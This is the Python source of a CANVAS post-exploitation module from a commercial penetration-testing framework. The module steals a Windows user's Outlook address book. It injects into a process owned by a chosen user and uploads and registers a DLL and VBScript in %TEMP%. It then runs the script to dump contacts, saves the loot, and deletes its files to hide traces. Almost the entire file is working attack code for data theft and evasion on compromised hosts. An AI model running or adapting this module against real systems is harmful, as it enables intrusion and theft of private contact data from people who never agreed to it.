 #! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys, copy

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
from canvaserror import *
from exploitmanager import *

NAME                = "Get content of a user's addressbook"
VERSION             = "1.0"
DESCRIPTION         = "Get as much info as we can from Outlook Address Book"

DOCUMENTATION       = {}
DOCUMENTATION["Info"]="""Interrogate the Outlook address book to gather information about this users relations to other entities.
                      Because of the controls implemented around the addressbook and MAPI we need to upload a dll which allows
                      us to access the properties we are after over EMAPI, then a vbscript to call the EMAPI and grab us our data.
                      After the data has been grabbed the dll is unregistered and vbscript removed.
                      """

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]


#TODO reset all file access times

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result = ""
        self.name   = NAME
        self.user_data_dict={}
        
        self.doOutlook  = True
        ##Dll which enable us to use EMAPI over MAPI
        self.dll_name   = "Redemption.dll"
        ##vbscript to get our info
        self.vbs_name   = "getOutlookAddressBook.vbs"
        ##Process of the user we want to inject
        self.inject_to = "explorer.exe"
        ##Name of user we want to get AB of
        self.process_user = "Administrator"
        ##Close the node we create when we exit?
        self.close_child_node_on_completion=True
        return
    
    def upload_dependencies(self, node):
        """
        Does a few things which are pre requisites for our info grab:
        -Find the %TEMP% location on this system
        -Upload the Redemption.dll
        -Upload vbscript
        """
        ##Find a env var %temp%
        self.log("New Node's ID: %s"%node.getname())
        self.log("New Nodes PID: %s"%node.shell.getpid())
        self.log("Token context: %s"%(node.shell.whoami()))
        
        self.temp_loc=node.shell.GetEnvironmentVariable("temp")+"\\"
        
        ##Upload dll and vbs
        #Here we upload them in the context of our new process - so we do not have SYSTEM privileges.
        try:
            node.shell.upload(os.path.join(self.engine.config["canvas_resources"], self.dll_name), self.temp_loc)
            node.shell.upload(os.path.join(self.engine.config["canvas_resources"], self.vbs_name), self.temp_loc)
        except NodeCommandError, err:
            self.log("Could not upload required component: %s"%err)
            return 0
        
        self.log("Dependencies for info grab (%s & %s) placed on system (%s) "%(self.dll_name, self.vbs_name, self.temp_loc))
        return 1
        
    

    
    def get_args(self):
        """
        Choose the extra things we wanna do
        """
        self.doOutlook  = self.argsDict.get('doOutlook', self.doOutlook)
        #self.inject_to = self.argsDict.get('injectTo', self.inject_to)
        self.process_user = self.argsDict.get('processUser', self.process_user)
        
    def cleanup(self, node):
        """
        Clean up after ourselves - remove and unregister everything
        """
        ##Unregister dll
        try:
            ret_dat=node.shell.runcommand("regsvr32.exe /s /u %s\\%s"%(self.temp_loc, self.dll_name))  ##TODO Fix for 64bit vista
            self.log("Unregistered DLL %s"%(self.dll_name))
        except NodeCommandError, err:
            self.log("Error unregistreing DLL (%s)"%(err))
            
        ##Remove the actual dll
        try:
            ret_dat=node.shell.unlink("%s\\%s"%(self.temp_loc, self.dll_name))
            self.log("DLL removed from %s%s"%(self.temp_loc, self.dll_name))
        except NodeCommandError, err:
            self.log("Error deleting DLL (%s)"%(err))
            
        ##Remove the vbs script
        try:
            ret_dat=node.shell.unlink("%s\\%s"%(self.temp_loc, self.vbs_name))
            self.log("vbscript removed from %s%s"%(self.temp_loc, self.vbs_name))
        except NodeCommandError, err:
            self.log("Error deleting vbscript (%s)"%(err))
            
        ##And finally close the low privilege node if we are set to do so
        #if self.close_child_node_on_completion:
        #    node.close_node_clean_gui()
            
    def run(self):
        
        self.get_args()
        
        self.setInfo("%s (in progress)" % (NAME))

        node        = self.argsDict["passednodes"][0]
        self.target_ip=node.get_interesting_interface()
        self.result = []


        for node in self.argsDict["passednodes"]:
            
            nodetype        = node.nodetype
            capabilities    = node.capabilities
            
            if node.nodetype in ["win32Node", "win64Node"]:
                
                ##Find a process owned by our targeted user
                self.log("Searching for process owned by: %s"%(self.process_user))
                #p_dict=self.get_process_owned_by(node, self.process_user,"VMwareUser.exe")
                p_dict=self.get_process_owned_by(node, self.process_user)
                if not p_dict:
                    self.log("Could not find process owned by %s. Stopping %s attempt."%(self.process_user, self.name))
                    ret=0
                    break
                
                ##Inject into a process, the owner of this process is whoose addressbook we grab
                pi = self.engine.getModuleExploit( "processinject" )
                inject=exploitmanager(pi, self.engine)
                inject.exploit.argsDict=copy.copy(self.argsDict)
                inject.exploit.callback=self.engine.autoListener(None, "Universal MOSDEF", self.target.interface)
                inject.exploit.pidorname=p_dict["pid"]
                inject.exploit.target = self.target
                inj_ret=inject.run()
                if not inj_ret:
                    self.log("Could not inject into the user '%s' process. Exiting."%(self.process_user))
                    ret=0
                    break
                    
                low_priv_node=inject.exploit.callback.lastnewnode
                if not low_priv_node:
                    self.log("Problem with the node returned from injected process %s. Exiting"%(p_dict["pid"]))
                    ret=0
                    break
                    
                
                self.log("Reverting to self ....")
                ret=low_priv_node.shell.SetThreadToken(0) #revert to self so that we are in the user's primary token context
                self.log("SetThreadToken returned %x"%ret)
                    
                ##upload requirements for our info grab
                if not self.upload_dependencies(low_priv_node):
                    ##Problem with upload, bail here
                    ret=0
                    self.cleanup(low_priv_node)
                    break
                
                ##Register our uploaded dll
                try:
                    self.log("Registering dll")
                    ret_dat=low_priv_node.shell.runcommand("regsvr32.exe /s %s\\%s"%(self.temp_loc, self.dll_name))  ##TODO Fix for 64bit vista
                    self.log("Done")
                except NodeCommandError, err:
                    self.log("Error registering dll (%s), stopping and cleaning up"%(err))
                    self.cleanup(low_priv_node)
                    ret =0
                    break                
                
                ##run the vbscript to gets us the datas :)
                try:
                    self.log("Running vbs")
                    ret_dat=low_priv_node.shell.runcommand("cscript /NoLogo %s\\%s"%(self.temp_loc, self.vbs_name))
                    self.log("What we know: %s"%(ret_dat))
                except NodeCommandError, err:
                    self.log("Error running vbscript (%s), stopping and cleaning up"%(err))
                    self.cleanup(low_priv_node)
                    ret =0
                    break
                
                ##Did the vbs run correctly?
                if " Microsoft VBScript runtime error" in ret_dat:
                    self.log("It seems the vbscript encountered an error: %s"%(ret_dat))
                    self.cleanup(low_priv_node)
                    ret =0
                    break
                
                ##OK all looks good, lets save out our data to the correct 'Reports dir'              
                save_dir=self.output(ip=self.target_ip, subdir=os.path.join("AddressBookInfo", self.process_user ,"Outlook"))
                ##For now dump the info we found just into a flat file - more to come ....
                ol_data=open(os.path.join(save_dir, "outlook_data_%s.txt"%(time.ctime().replace(" ","_"))), "w")
                ol_data.write(ret_dat)
                ol_data.close()
                
                
                ##Tidy tidy
                self.cleanup(low_priv_node)
                ret = 1
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result += [0]
                ret          = 0
                
        self.setInfo("%s - (finished)" % (NAME))
        return ret

